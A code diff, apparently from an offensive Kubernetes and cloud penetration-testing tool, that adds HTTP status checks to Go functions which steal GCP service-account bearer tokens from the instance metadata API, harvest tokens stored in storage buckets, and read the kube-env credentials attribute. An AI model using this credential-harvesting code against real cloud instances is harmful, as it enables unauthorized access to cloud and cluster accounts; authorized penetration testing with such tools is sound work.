@@ -27,10 +27,9 @@ func GetGCPBearerTokenFromMetadataAPI(account string) (string, time.Time, error)
 	baseURL := "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/"
 	urlSvcAccount := baseURL + account + "/token"
 
-	reqTokenRaw, _ := GetRequest(urlSvcAccount, headers, false)
+	reqTokenRaw, statusCode := GetRequest(urlSvcAccount, headers, false)
 
-	// TODO: Add a check for a 200 status code
-	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) {
+	if (reqTokenRaw == "") || (strings.HasPrefix(reqTokenRaw, "ERROR:")) || (statusCode != 200) {
 		errorString := "[-] Error - could not perform request for " + urlSvcAccount
 		println(errorString)
 		return "", time.Now(), errors.New(errorString)
@@ -152,14 +151,12 @@ eachbucket:
 					saTokenURL := objectURL + "?alt=media"
 
 					// We use the same headers[] from the previous GET request.
-					bodyToken, _ := GetRequest(saTokenURL, headers, false)
-					if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) {
+					bodyToken, statusCode := GetRequest(saTokenURL, headers, false)
+					if (bodyToken == "") || (strings.HasPrefix(bodyToken, "ERROR:")) || (statusCode != 200) {
 						continue eachbucket
 					}
 					tokenLines := strings.Split(string(bodyToken), "\n")
-					// TODO: Do we need to check status code?  if respToken.StatusCode != 200 {
 
-					//					var serviceAccountsToReturn []ServiceAccount
 					for _, line := range tokenLines {
 						// Now parse this line to get the token
 						encodedToken := strings.Split(line, "\"")[3]
@@ -194,11 +191,12 @@ func attackKubeEnvGCP(interactive bool) {
 	var headers = []HeaderLine{
 		{"Metadata-Flavor", "Google"},
 	}
-	kubeEnv, _ := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
-	if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) {
+	kubeEnv, statusCode := GetRequest("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env", headers, false)
+	if (kubeEnv == "") || (strings.HasPrefix(kubeEnv, "ERROR:")) || (statusCode != 200) {
 		println("[-] Error - could not perform request http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env/")
-		// TODO: Should we get error code the way we used to:
-		// fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", resp.StatusCode)
+		if statusCode != 200 {
+			fmt.Printf("[-] Attempt to get kube-env script failed with status code %d\n", statusCode)
+		}
 		pauseToHitEnter(interactive)
 		return
 	}
